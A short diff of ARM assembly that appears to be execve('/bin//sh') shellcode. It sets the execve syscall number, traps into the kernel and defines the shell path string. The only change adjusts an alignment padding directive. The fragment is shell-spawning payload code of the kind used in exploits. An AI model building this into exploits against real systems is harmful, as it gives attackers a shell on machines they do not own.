@@ -12,6 +12,6 @@ _start:
         mov r1, sp
         mov r7, #11
         svc 1
-        .balign 4, 1
+        .balign 4
 binsh:
         .ascii "/bin//sh"
